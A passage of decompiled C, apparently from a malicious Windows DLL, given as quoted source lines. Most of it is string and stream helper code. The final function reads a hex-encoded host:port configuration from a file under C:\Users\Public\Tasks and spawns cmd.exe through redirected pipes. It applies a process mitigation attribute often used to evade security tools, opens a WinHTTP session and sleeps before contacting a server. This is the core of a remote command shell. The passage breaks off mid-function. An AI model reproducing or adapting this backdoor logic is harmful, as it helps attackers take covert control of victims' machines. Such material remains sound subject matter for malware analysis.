    "  v33 = 0;",
    "  sub_180008790(v15, v17);",
    "  *(_QWORD *)((char *)&v17[-1] + v16[1]) = &off_18003A540;",
    "  *(_DWORD *)((char *)&v15[1] + v16[1] + 4) = v16[1] - 16;",
    "  *(_QWORD *)((char *)v15 + *(int *)(v15[0] + 4LL)) = &off_180044B28;",
    "  *(_DWORD *)((char *)&v14 + *(int *)(v15[0] + 4LL) + 4) = *(_DWORD *)(v15[0] + 4LL) - 32;",
    "  *(_QWORD *)((char *)v15 + *(int *)(v15[0] + 4LL)) = &off_180044B48;",
    "  *(_DWORD *)((char *)&v14 + *(int *)(v15[0] + 4LL) + 4) = *(_DWORD *)(v15[0] + 4LL) - 152;",
    "  sub_1800094E0(v17);",
    "  v17[0] = &off_180044AA8;",
    "  v4 = 0;",
    "  v23 = 0;",
    "  v5 = 0;",
    "  v24 = 0;",
    "  v6 = *(_QWORD **)(a2 + 8);",
    "  v7 = *(_QWORD **)a2;",
    "  if ( v7 != v6 )",
    "  {",
    "    do",
    "    {",
    "      v8 = v7;",
    "      if ( v7[3] > 0xFu )",
    "        v8 = (_QWORD *)*v7;",
    "      v9 = sub_18000D0A0(&v16, v8, v7[2]);",
    "      sub_180009C20(v9, \"\\n\");",
    "      v7 += 4;",
    "    }",
    "    while ( v7 != v6 );",
    "    v5 = v24;",
    "    v4 = v23;",
    "  }",
    "  *(_OWORD *)a1 = 0;",
    "  *(_QWORD *)(a1 + 16) = 0;",
    "  *(_QWORD *)(a1 + 24) = 15;",
    "  *(_BYTE *)a1 = 0;",
    "  if ( (v5 & 0x22) == 2 || (v10 = *v21) == 0 )",
    "  {",
    "    if ( (v5 & 4) != 0 || !*v20 )",
    "    {",
    "      v12 = 0;",
    "      v11 = 0;",
    "    }",
    "    else",
    "    {",
    "      v11 = *v18;",
    "      v12 = *v20 + *v22 - *v18;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v11 = *v19;",
    "    if ( v10 < v4 )",
    "      v10 = v4;",
    "    v12 = v10 - v11;",
    "  }",
    "  if ( v11 )",
    "    sub_180009720(a1, v11, v12);",
    "  sub_180003780(v15, v11, v12);",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180003780(_QWORD *a1)",
    "{",
    "  _QWORD *v2; // rsi",
    "  __int64 v3; // rcx",
    "",
    "  v2 = a1 + 19;",
    "  *(_QWORD *)((char *)v2 + *(int *)(*a1 + 4LL) - 152) = &off_180044B48;",
    "  *(_DWORD *)((char *)v2 + *(int *)(*a1 + 4LL) - 156) = *(_DWORD *)(*a1 + 4LL) - 152;",
    "  sub_180006730(a1 + 3);",
    "  *(_QWORD *)((char *)v2 + *(int *)(*a1 + 4LL) - 152) = &off_180044B28;",
    "  *(_DWORD *)((char *)v2 + *(int *)(*a1 + 4LL) - 156) = *(_DWORD *)(*a1 + 4LL) - 32;",
    "  *(_QWORD *)((char *)v2 + *(int *)(*(v2 - 17) + 4LL) - 136) = &off_18003A540;",
    "  v3 = *(int *)(*(v2 - 17) + 4LL);",
    "  *(_DWORD *)((char *)v2 + v3 - 140) = v3 - 16;",
    "  *(_QWORD *)((char *)v2 + *(int *)(*a1 + 4LL) - 152) = &off_180044A80;",
    "  *(_DWORD *)((char *)v2 + *(int *)(*a1 + 4LL) - 156) = *(_DWORD *)(*a1 + 4LL) - 24;",
    "  *v2 = &off_18003A520;",
    "  return sub_1800108D0(v2);",
    "}",
    "",
    "",
    "__int64 *__fastcall sub_180003870(__int64 *a1, _QWORD *a2)",
    "{",
    "  __int128 v4; // xmm0",
    "  int v5; // ebp",
    "  unsigned __int64 v6; // rsi",
    "  unsigned __int64 v7; // rax",
    "  unsigned __int64 v8; // rax",
    "  __int64 v9; // r8",
    "  _QWORD *v10; // rax",
    "  __int64 v11; // rdx",
    "  __int64 v12; // rcx",
    "  _DWORD *v13; // rax",
    "  _DWORD *v14; // r15",
    "  __int128 *v15; // rbx",
    "  __int64 v16; // rdx",
    "  __int64 v17; // r8",
    "  __int64 v18; // r9",
    "  unsigned __int64 v19; // rcx",
    "  unsigned __int64 v20; // rdx",
    "  __int64 *v21; // rax",
    "  unsigned __int64 v22; // rdx",
    "  __int64 v23; // rcx",
    "  __int128 *v25; // [rsp+30h] [rbp-58h] BYREF",
    "  __int128 v26; // [rsp+38h] [rbp-50h] BYREF",
    "  __int64 v27; // [rsp+48h] [rbp-40h]",
    "  unsigned __int64 v28; // [rsp+50h] [rbp-38h]",
    "",
    "  v4 = 0;",
    "  *(_OWORD *)a1 = 0;",
    "  a1[2] = 0;",
    "  a1[3] = 15;",
    "  *(_BYTE *)a1 = 0;",
    "  v5 = 1;",
    "  v6 = 0;",
    "  v7 = a2[2];",
    "  if ( v7 )",
    "  {",
    "    while ( 1 )",
    "    {",
    "      v28 = 0;",
    "      v27 = 0;",
    "      v26 = v4;",
    "      v8 = v7 - v6;",
    "      v9 = 2;",
    "      if ( v8 < 2 )",
    "        v9 = v8;",
    "      v10 = a2;",
    "      if ( a2[3] > 0xFu )",
    "        v10 = (_QWORD *)*a2;",
    "      sub_18000A3D0(&v26, (char *)v10 + v6, v9);",
    "      v5 |= 2u;",
    "      v13 = (_DWORD *)sub_18001A80C(v12, v11);",
    "      v14 = v13;",
    "      v15 = &v26;",
    "      if ( v28 > 0xF )",
    "        v15 = (__int128 *)v26;",
    "      *v13 = 0;",
    "      v18 = (unsigned int)sub_18001F0E0(v15, &v25, 16);",
    "      if ( v15 == v25 )",
    "        sub_18000FF6C(\"invalid stoi argument\", v16, v17, v18);",
    "      if ( *v14 == 34 )",
    "        sub_18000FFB4(\"stoi argument out of range\", v16, v17, v18);",
    "      v19 = a1[2];",
    "      v20 = a1[3];",
    "      if ( v19 >= v20 )",
    "      {",
    "        sub_18000AD70(a1, 1, 0, v18);",
    "      }",
    "      else",
    "      {",
    "        a1[2] = v19 + 1;",
    "        v21 = a1;",
    "        if ( v20 > 0xF )",
    "          v21 = (__int64 *)*a1;",
    "        *((_BYTE *)v21 + v19) = v18;",
    "        *((_BYTE *)v21 + v19 + 1) = 0;",
    "      }",
    "      if ( v28 > 0xF )",
    "      {",
    "        v22 = v28 + 1;",
    "        v23 = v26;",
    "        if ( v28 + 1 >= 0x1000 )",
    "        {",
    "          v22 = v28 + 40;",
    "          v23 = *(_QWORD *)(v26 - 8);",
    "          if ( (unsigned __int64)(v26 - v23 - 8) > 0x1F )",
    "            invalid_parameter_noinfo_noreturn();",
    "        }",
    "        sub_1800116E0(v23, v22);",
    "      }",
    "      v6 += 2LL;",
    "      v7 = a2[2];",
    "      if ( v6 >= v7 )",
    "        break;",
    "      v4 = 0;",
    "    }",
    "  }",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180003A40(_QWORD *a1, __int64 a2)",
    "{",
    "  __int64 v4; // rax",
    "  __int64 v5; // rax",
    "  __int64 v6; // rdx",
    "  unsigned __int8 v7; // di",
    "  void (__fastcall ***v8)(_QWORD, __int64); // rax",
    "  __int64 v9; // rax",
    "  unsigned __int64 v10; // rdx",
    "  __int64 v11; // rcx",
    "  __int64 v12; // rcx",
    "  int v13; // eax",
    "  int v14; // eax",
    "  int v15; // edx",
    "  __int64 v16; // rdx",
    "  __int64 v17; // rcx",
    "  const char *v19; // rbx",
    "  __m128i *v20; // rax",
    "  _BYTE v21[8]; // [rsp+30h] [rbp-D0h] BYREF",
    "  __int64 v22; // [rsp+38h] [rbp-C8h]",
    "  __int128 v23; // [rsp+40h] [rbp-C0h] BYREF",
    "  __m128i si128; // [rsp+50h] [rbp-B0h]",
    "  __int64 pExceptionObject[3]; // [rsp+60h] [rbp-A0h] BYREF",
    "  unsigned __int64 v26; // [rsp+78h] [rbp-88h]",
    "  int v27; // [rsp+8Ch] [rbp-74h]",
    "  _QWORD v28[2]; // [rsp+90h] [rbp-70h] BYREF",
    "  _DWORD v29[32]; // [rsp+A0h] [rbp-60h] BYREF",
    "  __int64 v30; // [rsp+120h] [rbp+20h]",
    "  void **v31; // [rsp+140h] [rbp+40h] BYREF",
    "",
    "  sub_1800368A0(v28, 0, 272);",
    "  if ( a1[3] > 0xFu )",
    "    a1 = (_QWORD *)*a1;",
    "  sub_180008490(v28, a1);",
    "  *(_QWORD *)((char *)v28 + *(int *)(v28[0] + 4LL)) = &off_180044B58;",
    "  *(int *)((char *)&v27 + *(int *)(v28[0] + 4LL)) = *(_DWORD *)(v28[0] + 4LL) - 176;",
    "  if ( v30 )",
    "  {",
    "    v23 = 0;",
    "    si128 = _mm_load_si128((const __m128i *)&xmmword_180044B80);",
    "    LOBYTE(v23) = 0;",
    "    while ( 1 )",
    "    {",
    "      v22 = *(_QWORD *)(*(_QWORD *)((char *)&v29[12] + *(int *)(v28[0] + 4LL)) + 8LL);",
    "      (*(void (**)(void))(*(_QWORD *)v22 + 8LL))();",
    "      v5 = sub_180009900(v21);",
    "      LOBYTE(v6) = 10;",
    "      v7 = (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)v5 + 64LL))(v5, v6);",
    "      if ( v22 )",
    "      {",
    "        v8 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v22 + 16LL))(v22);",
    "        if ( v8 )",
    "          (**v8)(v8, 1);",
    "      }",
    "      v9 = sub_18000CE50(v28, &v23, v7);",
    "      if ( (*(_BYTE *)(*(int *)(*(_QWORD *)v9 + 4LL) + v9 + 16) & 6) != 0 )",
    "        break;",
    "      sub_180003870(pExceptionObject, &v23);",
    "      if ( *(_QWORD *)(a2 + 8) == *(_QWORD *)(a2 + 16) )",
    "      {",
    "        sub_18000D360(a2, *(_QWORD *)(a2 + 8), pExceptionObject);",
    "      }",
    "      else",
    "      {",
    "        sub_180006D30(*(_QWORD *)(a2 + 8), pExceptionObject);",
    "        *(_QWORD *)(a2 + 8) += 32LL;",
    "      }",
    "      if ( v26 > 0xF )",
    "      {",
    "        v10 = v26 + 1;",
    "        v11 = pExceptionObject[0];",
    "        if ( v26 + 1 >= 0x1000 )",
    "        {",
    "          v10 = v26 + 40;",
    "          v11 = *(_QWORD *)(pExceptionObject[0] - 8);",
    "          if ( (unsigned __int64)(pExceptionObject[0] - v11 - 8) > 0x1F )",
    "            invalid_parameter_noinfo_noreturn();",
    "        }",
    "        sub_1800116E0(v11, v10);",
    "      }",
    "    }",
    "    if ( !sub_180008390(v29) )",
    "    {",
    "      v12 = *(int *)(v28[0] + 4LL);",
    "      v13 = 6;",
    "      if ( *(_QWORD *)((char *)&v29[14] + v12) )",
    "        v13 = 2;",
    "      v14 = (*(_DWORD *)((char *)v29 + v12) | v13) & 0x17;",
    "      *(_DWORD *)((char *)v29 + v12) = v14;",
    "      v15 = v14 & *(_DWORD *)((char *)&v29[1] + v12);",
    "      if ( v15 )",
    "      {",
    "        if ( (v15 & 4) != 0 )",
    "        {",
    "          v19 = \"ios_base::badbit set\";",
    "        }",
    "        else",
    "        {",
    "          v19 = \"ios_base::failbit set\";",
    "          if ( (v15 & 2) == 0 )",
    "            v19 = \"ios_base::eofbit set\";",
    "        }",
    "        v20 = (__m128i *)unknown_libname_1(v21, 1);",
    "        sub_180001E10(pExceptionObject, (__int64)v19, v20);",
    "        throw (std::ios_base::failure *)pExceptionObject;",
    "      }",
    "    }",
    "    if ( si128.m128i_i64[1] > 0xFuLL )",
    "    {",
    "      v16 = si128.m128i_i64[1] + 1;",
    "      v17 = v23;",
    "      if ( (unsigned __int64)(si128.m128i_i64[1] + 1) >= 0x1000 )",
    "      {",
    "        v16 = si128.m128i_i64[1] + 40;",
    "        v17 = *(_QWORD *)(v23 - 8);",
    "        if ( (unsigned __int64)(v23 - v17 - 8) > 0x1F )",
    "          invalid_parameter_noinfo_noreturn();",
    "      }",
    "      sub_1800116E0(v17, v16);",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v4 = sub_180009C20(&qword_18004C7A0, \"Error opening file!\");",
    "    sub_180009ED0(v4);",
    "  }",
    "  *(_QWORD *)((char *)v28 + *(int *)(v28[0] + 4LL)) = &off_180044B58;",
    "  *(int *)((char *)&v27 + *(int *)(v28[0] + 4LL)) = *(_DWORD *)(v28[0] + 4LL) - 176;",
    "  sub_180005CB0(v29);",
    "  *(_QWORD *)((char *)v28 + *(int *)(v28[0] + 4LL)) = &off_180044A80;",
    "  *(int *)((char *)&v27 + *(int *)(v28[0] + 4LL)) = *(_DWORD *)(v28[0] + 4LL) - 24;",
    "  v31 = &off_18003A520;",
    "  return sub_1800108D0(&v31);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180003D70(_QWORD *a1)",
    "{",
    "  _QWORD *v2; // rdi",
    "",
    "  v2 = a1 + 22;",
    "  *(_QWORD *)((char *)v2 + *(int *)(*a1 + 4LL) - 176) = &off_180044B58;",
    "  *(_DWORD *)((char *)v2 + *(int *)(*a1 + 4LL) - 180) = *(_DWORD *)(*a1 + 4LL) - 176;",
    "  sub_180005CB0(a1 + 2);",
    "  *(_QWORD *)((char *)v2 + *(int *)(*a1 + 4LL) - 176) = &off_180044A80;",
    "  *(_DWORD *)((char *)v2 + *(int *)(*a1 + 4LL) - 180) = *(_DWORD *)(*a1 + 4LL) - 24;",
    "  *v2 = &off_18003A520;",
    "  return sub_1800108D0(v2);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180003E10(__int64 a1, _QWORD *a2)",
    "{",
    "  _QWORD *v4; // rdx",
    "  __int64 v5; // r8",
    "  __int64 v6; // rax",
    "  __int64 v7; // rdx",
    "  unsigned __int8 v8; // bl",
    "  void (__fastcall ***v9)(_QWORD, __int64); // rax",
    "  __int64 v10; // rdx",
    "  __int64 v11; // rcx",
    "  _DWORD *v12; // rax",
    "  _DWORD *v13; // rsi",
    "  __int128 *v14; // rbx",
    "  __int64 v15; // rdx",
    "  __int64 v16; // r8",
    "  __int64 v17; // r9",
    "  int v18; // r14d",
    "  __int64 v19; // rdx",
    "  __int64 v20; // rcx",
    "  __int64 v21; // rdx",
    "  __int64 v22; // rcx",
    "  __int128 *v24; // [rsp+28h] [rbp-D8h] BYREF",
    "  __int64 v25; // [rsp+30h] [rbp-D0h]",
    "  __int128 v26; // [rsp+38h] [rbp-C8h] BYREF",
    "  __m128i v27; // [rsp+48h] [rbp-B8h]",
    "  __int128 v28; // [rsp+58h] [rbp-A8h] BYREF",
    "  __m128i si128; // [rsp+68h] [rbp-98h]",
    "  int v30; // [rsp+7Ch] [rbp-84h]",
    "  _QWORD v31[2]; // [rsp+80h] [rbp-80h] BYREF",
    "  int *v32; // [rsp+90h] [rbp-70h]",
    "  _QWORD v33[19]; // [rsp+98h] [rbp-68h] BYREF",
    "  int v34; // [rsp+130h] [rbp+30h]",
    "  __int64 v35; // [rsp+138h] [rbp+38h]",
    "  __int128 v36; // [rsp+140h] [rbp+40h]",
    "  __int128 v37; // [rsp+150h] [rbp+50h]",
    "  __int128 v38; // [rsp+160h] [rbp+60h]",
    "  char v39; // [rsp+170h] [rbp+70h]",
    "",
    "  v24 = (__int128 *)a1;",
    "  sub_1800368A0(v31, 0, 248);",
    "  v31[0] = &unk_180044B38;",
    "  v32 = (int *)&unk_180044B30;",
    "  v33[17] = 0;",
    "  v33[18] = 0;",
    "  v34 = 0;",
    "  v35 = 0;",
    "  v36 = 0;",
    "  v37 = 0;",
    "  v33[16] = &off_18003A530;",
    "  v38 = 0;",
    "  v39 = 0;",
    "  sub_180008790(v31, v33);",
    "  *(_QWORD *)((char *)&v33[-1] + v32[1]) = &off_18003A540;",
    "  *(_DWORD *)((char *)&v31[1] + v32[1] + 4) = v32[1] - 16;",
    "  *(_QWORD *)((char *)v31 + *(int *)(v31[0] + 4LL)) = &off_180044B28;",
    "  *(int *)((char *)&v30 + *(int *)(v31[0] + 4LL)) = *(_DWORD *)(v31[0] + 4LL) - 32;",
    "  *(_QWORD *)((char *)v31 + *(int *)(v31[0] + 4LL)) = &off_180044B48;",
    "  *(int *)((char *)&v30 + *(int *)(v31[0] + 4LL)) = *(_DWORD *)(v31[0] + 4LL) - 152;",
    "  v24 = (__int128 *)v33;",
    "  sub_1800094E0(v33);",
    "  v33[0] = &off_180044AA8;",
    "  v4 = a2;",
    "  if ( a2[3] > 0xFu )",
    "    v4 = (_QWORD *)*a2;",
    "  sub_180009390(v33, v4, a2[2], 0, 2);",
    "  v28 = 0;",
    "  si128 = _mm_load_si128((const __m128i *)&xmmword_180044B80);",
    "  LOBYTE(v28) = 0;",
    "  v26 = 0;",
    "  v27 = si128;",
    "  LOBYTE(v26) = 0;",
    "  LOBYTE(v5) = 58;",
    "  sub_18000CE50(v31, &v28, v5);",
    "  v25 = *(_QWORD *)(*(_QWORD *)((char *)&v33[5] + *(int *)(v31[0] + 4LL)) + 8LL);",
    "  (*(void (**)(void))(*(_QWORD *)v25 + 8LL))();",
    "  v6 = sub_180009900(&v24);",
    "  LOBYTE(v7) = 10;",
    "  v8 = (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)v6 + 64LL))(v6, v7);",
    "  if ( v25 )",
    "  {",
    "    v9 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v25 + 16LL))(v25);",
    "    if ( v9 )",
    "      (**v9)(v9, 1);",
    "  }",
    "  sub_18000CE50(v31, &v26, v8);",
    "  v12 = (_DWORD *)sub_18001A80C(v11, v10);",
    "  v13 = v12;",
    "  v14 = &v26;",
    "  if ( v27.m128i_i64[1] > 0xFuLL )",
    "    v14 = (__int128 *)v26;",
    "  *v12 = 0;",
    "  v18 = sub_18001F0E0(v14, &v24, 10);",
    "  if ( v14 == v24 )",
    "    sub_18000FF6C(\"invalid stoi argument\", v15, v16, v17);",
    "  if ( *v13 == 34 )",
    "    sub_18000FFB4(\"stoi argument out of range\", v15, v16, v17);",
    "  sub_180006D30(a1, &v28);",
    "  *(_DWORD *)(a1 + 32) = v18;",
    "  if ( v27.m128i_i64[1] > 0xFuLL )",
    "  {",
    "    v19 = v27.m128i_i64[1] + 1;",
    "    v20 = v26;",
    "    if ( (unsigned __int64)(v27.m128i_i64[1] + 1) >= 0x1000 )",
    "    {",
    "      v19 = v27.m128i_i64[1] + 40;",
    "      v20 = *(_QWORD *)(v26 - 8);",
    "      if ( (unsigned __int64)(v26 - v20 - 8) > 0x1F )",
    "        invalid_parameter_noinfo_noreturn();",
    "    }",
    "    sub_1800116E0(v20, v19);",
    "  }",
    "  v27 = _mm_load_si128((const __m128i *)&xmmword_180044B80);",
    "  LOBYTE(v26) = 0;",
    "  if ( si128.m128i_i64[1] > 0xFuLL )",
    "  {",
    "    v21 = si128.m128i_i64[1] + 1;",
    "    v22 = v28;",
    "    if ( (unsigned __int64)(si128.m128i_i64[1] + 1) >= 0x1000 )",
    "    {",
    "      v21 = si128.m128i_i64[1] + 40;",
    "      v22 = *(_QWORD *)(v28 - 8);",
    "      if ( (unsigned __int64)(v28 - v22 - 8) > 0x1F )",
    "        invalid_parameter_noinfo_noreturn();",
    "    }",
    "    sub_1800116E0(v22, v21);",
    "  }",
    "  sub_180003780(v31);",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180004160(__int64 *a1)",
    "{",
    "  unsigned __int64 v1; // rdx",
    "  __int64 v3; // rcx",
    "  unsigned __int64 v4; // rdx",
    "  __int64 result; // rax",
    "",
    "  v1 = a1[3];",
    "  if ( v1 > 0xF )",
    "  {",
    "    v3 = *a1;",
    "    v4 = v1 + 1;",
    "    if ( v4 >= 0x1000 )",
    "    {",
    "      v4 += 39LL;",
    "      if ( (unsigned __int64)(v3 - *(_QWORD *)(v3 - 8) - 8) > 0x1F )",
    "        invalid_parameter_noinfo_noreturn();",
    "      v3 = *(_QWORD *)(v3 - 8);",
    "    }",
    "    result = sub_1800116E0(v3, v4);",
    "  }",
    "  a1[2] = 0;",
    "  a1[3] = 15;",
    "  *(_BYTE *)a1 = 0;",
    "  return result;",
    "}",
    "",
    "",
    "void sub_1800041C0()",
    "{",
    "  HANDLE ProcessHeap; // rax",
    "  HANDLE v1; // rax",
    "  __int64 v2; // rax",
    "  __int64 v3; // rcx",
    "  __int64 v4; // rdx",
    "  int v5; // edi",
    "  __int64 v6; // rbx",
    "  __int64 v7; // rcx",
    "  __int64 v8; // rbx",
    "  unsigned __int64 v9; // rdx",
    "  __int64 v10; // rcx",
    "  unsigned __int64 v11; // rdx",
    "  __int128 *v12; // rsi",
    "  unsigned __int64 v13; // rdi",
    "  unsigned __int64 v14; // rbx",
    "  unsigned __int64 v15; // rax",
    "  __int64 v16; // rax",
    "  __int64 v17; // rcx",
    "  unsigned __int64 v18; // rax",
    "  unsigned __int64 v19; // rcx",
    "  char v20; // r12",
    "  __int64 v21; // rbx",
    "  int v22; // eax",
    "  __int64 v23; // rdi",
    "  unsigned __int64 v24; // rdx",
    "  __int64 v25; // rcx",
    "  unsigned __int64 v26; // rdx",
    "  _OWORD *v27; // r15",
    "  __int64 v28; // r14",
    "  unsigned __int64 v29; // r13",
    "  unsigned __int64 v30; // rsi",
    "  unsigned __int64 v31; // rdi",
    "  unsigned __int64 v32; // rax",
    "  unsigned __int64 v33; // rcx",
    "  unsigned __int64 v34; // rax",
    "  __int64 v35; // rax",
    "  __int64 v36; // rcx",
    "  unsigned __int64 v37; // rdx",
    "  __int64 v38; // rcx",
    "  unsigned __int64 v39; // rdx",
    "  __int64 v40; // rax",
    "  unsigned __int64 v41; // rdx",
    "  __int64 v42; // rcx",
    "  __int64 v43; // rax",
    "  __int64 v44; // rax",
    "  __int64 v45; // rax",
    "  __int64 v46; // rbx",
    "  __int64 v47; // rax",
    "  __int64 v48; // rdi",
    "  __int64 v49; // rax",
    "  __int64 v50; // rax",
    "  __int64 v51; // rax",
    "  __int64 v52; // rsi",
    "  __int64 v53; // rdi",
    "  __int64 v54; // rax",
    "  __int64 v55; // rax",
    "  __int64 v56; // rcx",
    "  __int64 v57; // rdx",
    "  HANDLE v58; // rax",
    "  __int64 v59; // rdx",
    "  __int64 v60; // rcx",
    "  __m128i si128; // xmm0",
    "  unsigned __int64 v62; // rdx",
    "  __int64 v63; // r14",
    "  unsigned __int64 v64; // rdx",
    "  __int64 v65; // rcx",
    "  __int64 v66; // rcx",
    "  unsigned __int64 v67; // rdx",
    "  __int64 v68; // rdx",
    "  __int64 v69; // rcx",
    "  __int64 v70; // rcx",
    "  unsigned __int64 v71; // rdx",
    "  __int64 v72; // rdx",
    "  __int64 v73; // rcx",
    "  char v74; // [rsp+50h] [rbp-B0h]",
    "  __int128 v75; // [rsp+58h] [rbp-A8h] BYREF",
    "  __int64 v76; // [rsp+68h] [rbp-98h]",
    "  struct _SECURITY_ATTRIBUTES PipeAttributes; // [rsp+70h] [rbp-90h] BYREF",
    "  unsigned __int64 v78; // [rsp+88h] [rbp-78h]",
    "  __int128 v79; // [rsp+90h] [rbp-70h] BYREF",
    "  __int64 v80; // [rsp+A0h] [rbp-60h]",
    "  __int64 Value; // [rsp+A8h] [rbp-58h] BYREF",
    "  __int128 v82; // [rsp+B0h] [rbp-50h] BYREF",
    "  __m128i v83; // [rsp+C0h] [rbp-40h]",
    "  _QWORD v84[2]; // [rsp+D0h] [rbp-30h] BYREF",
    "  unsigned __int64 v85; // [rsp+E0h] [rbp-20h]",
    "  unsigned __int64 v86; // [rsp+E8h] [rbp-18h]",
    "  int v87; // [rsp+F0h] [rbp-10h]",
    "  __int128 v88; // [rsp+F8h] [rbp-8h] BYREF",
    "  __int128 v89; // [rsp+108h] [rbp+8h]",
    "  __int64 v90; // [rsp+118h] [rbp+18h] BYREF",
    "  __m128i v91; // [rsp+128h] [rbp+28h]",
    "  _QWORD v92[2]; // [rsp+138h] [rbp+38h] BYREF",
    "  unsigned __int64 v93; // [rsp+148h] [rbp+48h]",
    "  unsigned __int64 v94; // [rsp+150h] [rbp+50h]",
    "  int v95; // [rsp+158h] [rbp+58h]",
    "  _QWORD v96[3]; // [rsp+160h] [rbp+60h] BYREF",
    "  unsigned __int64 v97; // [rsp+178h] [rbp+78h]",
    "  _QWORD v98[3]; // [rsp+180h] [rbp+80h] BYREF",
    "  unsigned __int64 v99; // [rsp+198h] [rbp+98h]",
    "",
    "  v88 = 0;",
    "  v89 = 0;",
    "  sub_18000A3D0(&v88, \"C:\\\\Users\\\\Public\\\\Tasks\\\\xeh.txt\", 29);",
    "  v79 = 0;",
    "  v80 = 0;",
    "  sub_180003A40(&v88, (__int64)&v79);",
    "  sub_180003520((__int64)&v90, (__int64)&v79);",
    "  StartupInfo = 112;",
    "  *(_QWORD *)&PipeAttributes.nLength = 24;",
    "  *(_QWORD *)&PipeAttributes.bInheritHandle = 1;",
    "  PipeAttributes.lpSecurityDescriptor = 0;",
    "  CreatePipe((PHANDLE)&hObject, &hWritePipe, &PipeAttributes, 0);",
    "  CreatePipe(&lpParameter, (PHANDLE)&qword_18004E188, &PipeAttributes, 0);",
    "  *(&StartupInfo + 10) = hObject;",
    "  *(&StartupInfo + 11) = qword_18004E188;",
    "  *(&StartupInfo + 12) = qword_18004E188;",
    "  *(&StartupInfo + 15) |= 0x101u;",
    "  InitializeProcThreadAttributeList(0, 1u, 0, (PSIZE_T)&Size);",
    "  ProcessHeap = GetProcessHeap();",
    "  lpMem = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(ProcessHeap, 8u, *(SIZE_T *)&Size);",
    "  InitializeProcThreadAttributeList(lpMem, 1u, 0, (PSIZE_T)&Size);",
    "  Value = 0x100000000000LL;",
    "  UpdateProcThreadAttribute(lpMem, 0, 0x20007u, &Value, 8u, 0, 0);",
    "  qword_18004E168 = (__int64)lpMem;",
    "  CreateProcessA(",
    "    0,",
    "    (LPSTR)\"cmd.exe\",",
    "    0,",
    "    0,",
    "    1,",
    "    0x80000u,",
    "    0,",
    "    0,",
    "    (LPSTARTUPINFOA)&StartupInfo,",
    "    (LPPROCESS_INFORMATION)&ProcessInformation);",
    "  v1 = GetProcessHeap();",
    "  HeapFree(v1, 8u, lpMem);",
    "  hSession = WinHttpOpen((LPCWSTR)L\"WinHTTP\", 0, 0, 0, 0);",
    "  v75 = 0u;",
    "  v2 = 0;",
    "  v3 = 0;",
    "  v76 = 0;",
    "  v4 = v79;",
    "  v5 = ((__int64)(*((_QWORD *)&v79 + 1) - v79) >> 5) - 1;",
    "  if ( v5 >= 0 )",
    "  {",
    "    v6 = 32LL * v5;",
    "    while ( 1 )",
    "    {",
    "      if ( v2 == v3 )",
    "      {",
    "        sub_18000D360(&v75, v2, v4 + v6);",
    "        v2 = *((_QWORD *)&v75 + 1);",
    "      }",
    "      else",
    "      {",
    "        sub_180006D30(v2, v4 + v6);",
    "        v2 = *((_QWORD *)&v75 + 1) + 32LL;",
    "        *((_QWORD *)&v75 + 1) += 32LL;",
    "      }",
    "      v6 -= 32;",
    "      if ( --v5 < 0 )",
    "        break;",
    "      v4 = v79;",
    "      v3 = v76;",
    "    }",
    "  }",
    "  Sleep(0x493E0u);",
    "  v7 = v75;",
    "  if ( (_QWORD)v75 == *((_QWORD *)&v75 + 1) )",
    "  {",
    "LABEL_116:",
    "    si128 = _mm_load_si128((const __m128i *)&xmmword_180044B80);",
    "    goto LABEL_117;",
    "  }",
    "  sub_180006D30(v98, *((_QWORD *)&v75 + 1) - 32LL);",
    "  v8 = *((_QWORD *)&v75 + 1);",
    "  v9 = *(_QWORD *)(*((_QWORD *)&v75 + 1) - 8LL);",
    "  if ( v9 > 0xF )",
    "  {",
    "    v10 = *(_QWORD *)(*((_QWORD *)&v75 + 1) - 32LL);",
    "    v11 = v9 + 1;",
    "    if ( v11 >= 0x1000 )",
    "    {",
    "      v11 += 39LL;",
    "      if ( (unsigned __int64)(v10 - *(_QWORD *)(v10 - 8) - 8) > 0x1F )",
    "        goto LABEL_144;",
    "      v10 = *(_QWORD *)(v10 - 8);",
    "    }",
    "    sub_1800116E0(v10, v11);",
    "  }",
    "  *(_QWORD *)(v8 - 16) = 0;",
    "  *(_QWORD *)(v8 - 8) = 15;",
    "  *(_BYTE *)(v8 - 32) = 0;",
    "  *((_QWORD *)&v75 + 1) -= 32LL;",
    "  sub_180003E10((__int64)v84, v98);",
    "  v82 = 0;",
    "  v83 = 0;",
    "  v12 = (__int128 *)v84;",
    "  if ( v86 > 0xF )",
    "    v12 = (__int128 *)v84[0];",
    "  v13 = v85;",
    "  if ( v85 > 0x7FFFFFFFFFFFFFFFLL )",
    "    std::vector<void *>::_Xlen();",
    "  if ( v85 > 0xF )",
    "  {",
    "    v14 = v85 | 0xF;",
    "    if ( (v85 | 0xF) > 0x7FFFFFFFFFFFFFFFLL )",
    "    {",
    "      v14 = 0x7FFFFFFFFFFFFFFFLL;",
    "      v15 = 0x8000000000000027uLL;",
    "LABEL_21:",
    "      v16 = sub_180011714(v15);",
    "      v17 = v16;",
    "      if ( !v16 )",
    "        goto LABEL_143;",
    "      v18 = (v16 + 39) & 0xFFFFFFFFFFFFFFE0uLL;",
    "      *(_QWORD *)(v18 - 8) = v17;",
    "      goto LABEL_31;",
    "    }",
    "    if ( v14 < 0x16 )",
    "      v14 = 22;",
    "    v19 = v14 + 1;",
    "    if ( v14 == -1 )",
    "    {",
    "      v18 = 0;",
    "    }",
    "    else",
    "    {",
    "      if ( v19 >= 0x1000 )",
    "      {",
    "        v15 = v14 + 40;",
    "        if ( v14 + 40 < v14 + 1 )",
    "          Concurrency::cancel_current_task();",
    "        goto LABEL_21;",
    "      }",
    "      v18 = sub_180011714(v19);",
    "    }",
    "LABEL_31:",
    "    *(_QWORD *)&v82 = v18;",
    "    v83.m128i_i64[0] = v13;",
    "    v83.m128i_i64[1] = v14;",
    "    sub_180036160(v18, v12, v13 + 1);",
    "    goto LABEL_32;",
    "  }",
